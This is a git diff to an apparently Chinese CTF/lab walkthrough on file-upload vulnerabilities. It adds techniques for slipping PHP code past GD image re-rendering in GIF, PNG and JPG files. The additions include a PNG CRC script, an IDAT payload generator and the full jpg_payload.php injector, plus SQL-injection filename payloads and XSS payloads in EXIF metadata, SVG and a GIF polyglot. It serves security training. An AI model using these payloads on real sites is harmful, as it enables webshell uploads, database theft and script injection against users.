@@ -770,7 +770,7 @@ if(isset($_POST['submit'])){
 
 ![](../../.gitbook/assets/image%20%28667%29.png)
 
-### pass-17-二次渲染
+### pass-17-[二次渲染](https://github.com/fakhrizulkifli/Defeating-PHP-GD-imagecreatefromgif)
 
 ```php
 $is_upload = false;
@@ -861,7 +861,386 @@ if (isset($_POST['submit'])){
 
 思路：
 
-将上传的图片重新下载下来，放入winhex，进行对比。可以找到二次渲染后不变的地方，而=这个地方就是可以插入一句话的地方。
+将上传的图片重新下载下来，放入winhex，进行对比。可以找到二次渲染后不变的地方，而这个地方就是可以插入一句话的地方。
+
+第71行检测`$fileext`和`$filetype`是否为gif格式.
+
+然后73行使用`move_uploaded_file`函数来做判断条件,如果成功将文件移动到`$target_path`,就会进入二次渲染的代码,反之上传失败.
+
+在这里有一个问题,如果作者是想考察绕过二次渲染的话,在`move_uploaded_file($tmpname,$target_path)`返回true的时候,就已经成功将图片马上传到服务器了,所以下面的二次渲染并不会影响到图片马的上传.如果是想考察文件后缀和`content-type`的话,那么二次渲染的代码就很多余.\(到底考点在哪里,只有作者清楚.哈哈\)
+
+由于在二次渲染时重新生成了文件名,所以可以根据上传后的文件名,来判断上传的图片是二次渲染后生成的图片还是直接由`move_uploaded_file`函数移动的图片.
+
+我看过的writeup都是直接由`move_uploaded_file`函数上传的图片马.今天我们把`move_uploaded_file`这个判断条件去除,然后尝试上传图片马.
+
+{% tabs %}
+{% tab title="GIF" %}
+将`<?php phpinfo(); ?>`添加到111.gif的尾部.
+
+![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly94emZpbGUuYWxpeXVuY3MuY29tL21lZGlhL3VwbG9hZC9waWN0dXJlLzIwMTgwODI5MDg0MDU0LTMwMDg4YmI0LWFiMjQtMS5wbmc?x-oss-process=image/format,png)
+
+成功上传含有一句话的111.gif,但是这并没有成功.我们将上传的图片下载到本地.  
+
+
+![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly94emZpbGUuYWxpeXVuY3MuY29tL21lZGlhL3VwbG9hZC9waWN0dXJlLzIwMTgwODI5MDg0MDU0LTMwMTI0YTk2LWFiMjQtMS5wbmc?x-oss-process=image/format,png)
+
+可以看到下载下来的文件名已经变化,所以这是经过二次渲染的图片.我们使用16进制编辑器将其打开.  
+
+
+![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly94emZpbGUuYWxpeXVuY3MuY29tL21lZGlhL3VwbG9hZC9waWN0dXJlLzIwMTgwODI5MDg0MDU0LTMwMWVmMjhjLWFiMjQtMS5wbmc?x-oss-process=image/format,png)
+
+可以发现,我们在gif末端添加的php代码已经被去除.
+
+关于绕过gif的二次渲染,我们只需要找到渲染前后没有变化的位置,然后将php代码写进去,就可以成功上传带有php代码的图片了.
+
+经过对比,蓝色部分是没有发生变化的,  
+
+
+![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly94emZpbGUuYWxpeXVuY3MuY29tL21lZGlhL3VwbG9hZC9waWN0dXJlLzIwMTgwODI5MDg0MDU1LTMwMzRhZmU2LWFiMjQtMS5wbmc?x-oss-process=image/format,png)
+
+我们将代码写到该位置.  
+
+
+![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly94emZpbGUuYWxpeXVuY3MuY29tL21lZGlhL3VwbG9hZC9waWN0dXJlLzIwMTgwODI5MDg0MDU1LTMwNDYyZWQ4LWFiMjQtMS5wbmc?x-oss-process=image/format,png)
+
+上传后在下载到本地使用16进制编辑器打开  
+
+
+![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly94emZpbGUuYWxpeXVuY3MuY29tL21lZGlhL3VwbG9hZC9waWN0dXJlLzIwMTgwODI5MDg0MDU1LTMwNTliYjA2LWFiMjQtMS5wbmc?x-oss-process=image/format,png)
+
+可以看到php代码没有被去除.成功上传图片马
+{% endtab %}
+
+{% tab title="PNG" %}
+png的二次渲染的绕过并不能像gif那样简单.
+
+#### png文件组成 <a id="toc-4"></a>
+
+png图片由3个以上的数据块组成.
+
+PNG定义了两种类型的数据块，一种是称为关键数据块\(critical chunk\)，这是标准的数据块，另一种叫做辅助数据块\(ancillary chunks\)，这是可选的数据块。关键数据块定义了3个标准数据块\(IHDR,IDAT, IEND\)，每个PNG文件都必须包含它们.
+
+数据块结构
+
+![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly94emZpbGUuYWxpeXVuY3MuY29tL21lZGlhL3VwbG9hZC9waWN0dXJlLzIwMTgwODI5MDg0MDU1LTMwNjVjMjM0LWFiMjQtMS5wbmc?x-oss-process=image/format,png)
+
+CRC\(cyclic redundancy check\)域中的值是对Chunk Type Code域和Chunk Data域中的数据进行计算得到的。CRC具体算法定义在ISO 3309和ITU-T V.42中，其值按下面的CRC码生成多项式进行计算：
+
+x32+x26+x23+x22+x16+x12+x11+x10+x8+x7+x5+x4+x2+x+1
+
+#### 分析数据块 <a id="toc-5"></a>
+
+IHDR
+
+数据块IHDR\(header chunk\)：它包含有PNG文件中存储的图像数据的基本信息，并要作为第一个数据块出现在PNG数据流中，而且一个PNG数据流中只能有一个文件头数据块。
+
+文件头数据块由13字节组成，它的格式如下图所示。
+
+![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly94emZpbGUuYWxpeXVuY3MuY29tL21lZGlhL3VwbG9hZC9waWN0dXJlLzIwMTgwODI5MDg0MDU1LTMwNzQ4MDU4LWFiMjQtMS5wbmc?x-oss-process=image/format,png)
+
+PLTE
+
+调色板PLTE数据块是辅助数据块,对于索引图像，调色板信息是必须的，调色板的颜色索引从0开始编号，然后是1、2……，调色板的颜色数不能超过色深中规定的颜色数（如图像色深为4的时候，调色板中的颜色数不可以超过2^4=16），否则，这将导致PNG图像不合法。
+
+IDAT
+
+图像数据块IDAT\(image data chunk\)：它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块。
+
+IDAT存放着图像真正的数据信息，因此，如果能够了解IDAT的结构，我们就可以很方便的生成PNG图像
+
+IEND
+
+图像结束数据IEND\(image trailer chunk\)：它用来标记PNG文件或者数据流已经结束，并且必须要放在文件的尾部。
+
+如果我们仔细观察PNG文件，我们会发现，文件的结尾12个字符看起来总应该是这样的：
+
+00 00 00 00 49 45 4E 44 AE 42 60 82
+
+#### 写入php代码 <a id="toc-6"></a>
+
+在网上找到了两种方式来制作绕过二次渲染的png木马.
+
+写入PLTE数据块
+
+php底层在对PLTE数据块验证的时候,主要进行了CRC校验.所以可以再chunk data域插入php代码,然后重新计算相应的crc值并修改即可.
+
+这种方式只针对索引彩色图像的png图片才有效,在选取png图片时可根据IHDR数据块的color type辨别.`03`为索引彩色图像.
+
+1. 在PLTE数据块写入php代码. 
+2. 计算PLTE数据块的CRC  CRC脚本
+
+![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly94emZpbGUuYWxpeXVuY3MuY29tL21lZGlhL3VwbG9hZC9waWN0dXJlLzIwMTgwODI5MDg0MDU1LTMwODQ3MDYyLWFiMjQtMS5wbmc?x-oss-process=image/format,png)
+
+```python
+import binascii
+import re
+ 
+png = open(r'2.png','rb')
+a = png.read()
+png.close()
+hexstr = binascii.b2a_hex(a)
+ 
+''' PLTE crc '''
+data =  '504c5445'+ re.findall('504c5445(.*?)49444154',hexstr)[0]
+crc = binascii.crc32(data[:-16].decode('hex')) & 0xffffffff
+print hex(crc)
+```
+
+运行结果
+
+```text
+526579b0
+```
+
+3.修改CRC值
+
+![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly94emZpbGUuYWxpeXVuY3MuY29tL21lZGlhL3VwbG9hZC9waWN0dXJlLzIwMTgwODI5MDg0MDU1LTMwOTQ4YmZhLWFiMjQtMS5wbmc?x-oss-process=image/format,png)
+
+4.验证  
+ 将修改后的png图片上传后,下载到本地打开  
+
+
+![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly94emZpbGUuYWxpeXVuY3MuY29tL21lZGlhL3VwbG9hZC9waWN0dXJlLzIwMTgwODI5MDg0MDU1LTMwYTM5ZTJlLWFiMjQtMS5wbmc?x-oss-process=image/format,png)
+
+写入IDAT数据块
+
+这里有国外大牛写的脚本,直接拿来运行即可.
+
+```php
+<?php
+$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
+           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
+           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
+           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
+           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
+           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
+           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
+           0x66, 0x44, 0x50, 0x33);
+ 
+$img = imagecreatetruecolor(32, 32);
+ 
+for ($y = 0; $y < sizeof($p); $y += 3) {
+   $r = $p[$y];
+   $g = $p[$y+1];
+   $b = $p[$y+2];
+   $color = imagecolorallocate($img, $r, $g, $b);
+   imagesetpixel($img, round($y / 3), 0, $color);
+}
+ 
+imagepng($img,'./1.png');
+?>
+```
+
+运行后得到1.png.上传后下载到本地打开如下图
+{% endtab %}
+
+{% tab title="JPG" %}
+这里也采用国外大牛编写的脚本jpg\_payload.php.
+
+```php
+<?php
+    /*
+    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().
+    It is necessary that the size and quality of the initial image are the same as those of the processed image.
+    1) Upload an arbitrary image via secured files upload script
+    2) Save the processed image and launch:
+    jpg_payload.php <jpg_name.jpg>
+    In case of successful injection you will get a specially crafted image, which should be uploaded again.
+    Since the most straightforward injection method is used, the following problems can occur:
+    1) After the second processing the injected data may become partially corrupted.
+    2) The jpg_payload.php script outputs "Something's wrong".
+    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.
+    Sergey Bobrov @Black2Fan.
+    See also:
+    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/
+    */
+ 
+    $miniPayload = "<?=phpinfo();?>";
+ 
+ 
+    if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {
+        die('php-gd is not installed');
+    }
+ 
+    if(!isset($argv[1])) {
+        die('php jpg_payload.php <jpg_name.jpg>');
+    }
+ 
+    set_error_handler("custom_error_handler");
+ 
+    for($pad = 0; $pad < 1024; $pad++) {
+        $nullbytePayloadSize = $pad;
+        $dis = new DataInputStream($argv[1]);
+        $outStream = file_get_contents($argv[1]);
+        $extraBytes = 0;
+        $correctImage = TRUE;
+ 
+        if($dis->readShort() != 0xFFD8) {
+            die('Incorrect SOI marker');
+        }
+ 
+        while((!$dis->eof()) && ($dis->readByte() == 0xFF)) {
+            $marker = $dis->readByte();
+            $size = $dis->readShort() - 2;
+            $dis->skip($size);
+            if($marker === 0xDA) {
+                $startPos = $dis->seek();
+                $outStreamTmp = 
+                    substr($outStream, 0, $startPos) . 
+                    $miniPayload . 
+                    str_repeat("\0",$nullbytePayloadSize) . 
+                    substr($outStream, $startPos);
+                checkImage('_'.$argv[1], $outStreamTmp, TRUE);
+                if($extraBytes !== 0) {
+                    while((!$dis->eof())) {
+                        if($dis->readByte() === 0xFF) {
+                            if($dis->readByte !== 0x00) {
+                                break;
+                            }
+                        }
+                    }
+                    $stopPos = $dis->seek() - 2;
+                    $imageStreamSize = $stopPos - $startPos;
+                    $outStream = 
+                        substr($outStream, 0, $startPos) . 
+                        $miniPayload . 
+                        substr(
+                            str_repeat("\0",$nullbytePayloadSize).
+                                substr($outStream, $startPos, $imageStreamSize),
+                            0,
+                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . 
+                                substr($outStream, $stopPos);
+                } elseif($correctImage) {
+                    $outStream = $outStreamTmp;
+                } else {
+                    break;
+                }
+                if(checkImage('payload_'.$argv[1], $outStream)) {
+                    die('Success!');
+                } else {
+                    break;
+                }
+            }
+        }
+    }
+    unlink('payload_'.$argv[1]);
+    die('Something\'s wrong');
+ 
+    function checkImage($filename, $data, $unlink = FALSE) {
+        global $correctImage;
+        file_put_contents($filename, $data);
+        $correctImage = TRUE;
+        imagecreatefromjpeg($filename);
+        if($unlink)
+            unlink($filename);
+        return $correctImage;
+    }
+ 
+    function custom_error_handler($errno, $errstr, $errfile, $errline) {
+        global $extraBytes, $correctImage;
+        $correctImage = FALSE;
+        if(preg_match('/(\d+) extraneous bytes before marker/', $errstr, $m)) {
+            if(isset($m[1])) {
+                $extraBytes = (int)$m[1];
+            }
+        }
+    }
+ 
+    class DataInputStream {
+        private $binData;
+        private $order;
+        private $size;
+ 
+        public function __construct($filename, $order = false, $fromString = false) {
+            $this->binData = '';
+            $this->order = $order;
+            if(!$fromString) {
+                if(!file_exists($filename) || !is_file($filename))
+                    die('File not exists ['.$filename.']');
+                $this->binData = file_get_contents($filename);
+            } else {
+                $this->binData = $filename;
+            }
+            $this->size = strlen($this->binData);
+        }
+ 
+        public function seek() {
+            return ($this->size - strlen($this->binData));
+        }
+ 
+        public function skip($skip) {
+            $this->binData = substr($this->binData, $skip);
+        }
+ 
+        public function readByte() {
+            if($this->eof()) {
+                die('End Of File');
+            }
+            $byte = substr($this->binData, 0, 1);
+            $this->binData = substr($this->binData, 1);
+            return ord($byte);
+        }
+ 
+        public function readShort() {
+            if(strlen($this->binData) < 2) {
+                die('End Of File');
+            }
+            $short = substr($this->binData, 0, 2);
+            $this->binData = substr($this->binData, 2);
+            if($this->order) {
+                $short = (ord($short[1]) << 8) + ord($short[0]);
+            } else {
+                $short = (ord($short[0]) << 8) + ord($short[1]);
+            }
+            return $short;
+        }
+ 
+        public function eof() {
+            return !$this->binData||(strlen($this->binData) === 0);
+        }
+    }
+?>
+```
+
+使用方法
+
+#### 准备 <a id="toc-8"></a>
+
+随便找一个jpg图片,先上传至服务器然后再下载到本地保存为`1.jpg`.
+
+#### 插入php代码 <a id="toc-9"></a>
+
+使用脚本处理`1.jpg`,命令`php jpg_payload.php 1.jpg`  
+  
+ 使用16进制编辑器打开,就可以看到插入的php代码.  
+
+
+![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly94emZpbGUuYWxpeXVuY3MuY29tL21lZGlhL3VwbG9hZC9waWN0dXJlLzIwMTgwODI5MDg0MDU2LTMwYzg2MGIwLWFiMjQtMS5wbmc?x-oss-process=image/format,png)
+
+![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly94emZpbGUuYWxpeXVuY3MuY29tL21lZGlhL3VwbG9hZC9waWN0dXJlLzIwMTgwODI5MDg0MDU1LTMwYmI0MjM2LWFiMjQtMS5wbmc?x-oss-process=image/format,png)
+
+#### 上传图片马 <a id="toc-10"></a>
+
+将生成的`payload_1.jpg`上传.  
+
+
+![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly94emZpbGUuYWxpeXVuY3MuY29tL21lZGlhL3VwbG9hZC9waWN0dXJlLzIwMTgwODI5MDg0MDU2LTMwZDNhMWEwLWFiMjQtMS5wbmc?x-oss-process=image/format,png)
+
+#### 验证 <a id="toc-11"></a>
+
+将上传的图片再次下载到本地,使用16进制编辑器打开  
+
+
+![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly94emZpbGUuYWxpeXVuY3MuY29tL21lZGlhL3VwbG9hZC9waWN0dXJlLzIwMTgwODI5MDg0MDU2LTMwZTE3YjY4LWFiMjQtMS5wbmc?x-oss-process=image/format,png)
+
+可以看到,php代码没有被去除.  
+证明我们成功上传了含有php代码的图片.
+
+需要注意的是,有一些jpg图片不能被处理,所以要多尝试一些jpg图片.
+{% endtab %}
+{% endtabs %}
+
+
 
 ### pass-18-条件竞争
 
@@ -1151,6 +1530,8 @@ reset(array &$array)
 
 {% tabs %}
 {% tab title="通关过程" %}
+步骤如下：
+
 ```text
 # 1 
 filename="'+(selselectect hex(database()))+'.jpg" 
@@ -1205,15 +1586,79 @@ filename="'+(selselectect+conv(substr(hex((selselectect table_name frfromom info
 {% endtab %}
 
 {% tab title="涉及知识点" %}
+1、SQL注入双写绕过
 
+2、语句拆解
+
+```text
+'+(selselectect+CONV(substr(hex(database()),1,12),16,10))+'
+
+# 数据流程：
+hex(database())    #将获取到的数据转换为16进制，设为a
+substr(a,1,12)     #将a中的数据取从第一位开始，取12个字符。设为b
+CONV(b,16,10)      #将b中的数据由16进制转为10进制
+```
+
+3、前后闭合  
+4、"+"号代替空格号。
 {% endtab %}
 {% endtabs %}
 
+### 2、[文件上传与XSS](https://www.freebuf.com/articles/web/101843.html)
+
+#### 1\) 文件名
+
+文件名本身可能就是网页的一部分可以造成反射，所以可以通过将 XSS 语句插入文件名中来触发反射。
+
+![](https://image.3001.net/images/20160415/14606935726900.gif)
+
+#### 2\) 元数据
+
+使用 exiftool 工具可以修改 EXIF 元数据，从而在某些地方造成反射：
+
+```text
+$ exiftool -FIELD=XSS FILE
+```
+
+例子：
+
+```text
+$ exiftool -Artist=’ “><img src=1 onerror=alert(document.domain)>’ brute.jpeg
+```
+
+![](../../.gitbook/assets/image%20%28671%29.png)
+
+#### 3\) 内容
+
+如果 Web 应用允许上传 SVG（一种图像类型）扩展名，则以下内容可以用来触发 XSS：
+
+```text
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
+```
+
+一个 POC 可以在这里看到 [brutelogic.com.br/poc.svg](http://brutelogic.com.br/poc.svg)。
+
+#### 4）源码
+
+我们可以很容易的创建一张包含 javascript payload 的 GIF 图片，然后将这张图片当做源码加以引用。如果我们可以成功的注入相同的域名，如下所示，则这样可以有效的帮我们绕过 CSP（内容安全策略）防护（其不允许执行例如`<script>alert(1)</script>`）
+
+![xss](https://image.3001.net/images/20160415/1460693586372.gif!small)
+
+创建这样一张图片可以使用如下内容并将文件命名为 .gif 后缀：
+
+```text
+GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
+```
+
+GIF 文件标识 GIF89a 做为一个 javascript 的变量分配给 alert 函数。中间注释部分的 XSS 是为了以防图像被检索为 text/HTML MIME 类型时，通过请求文件来执行 payload。
+
+我们通过下图可以发现，类 UNIX 命令的 PHP 函数 exif\_imagetype\(\) 和 getimagesize\(\) 都会将这个文件识别为 GIF 文件。而一般的 Web 应用都是使用这些函数来验证图像类型的，所以这样一个文件是可以被上传的（但上传后可能会被杀毒软件查杀）。
+
+![4.png](https://image.3001.net/images/20160415/14606935917753.png!small)
 
 
-2、[文件上传与XSS](https://www.freebuf.com/articles/web/101843.html)
 
-3、[bypass安全狗](https://www.freebuf.com/articles/web/247720.html)
+### 3、[bypass安全狗](https://www.freebuf.com/articles/web/247720.html)
 
  方法：
 
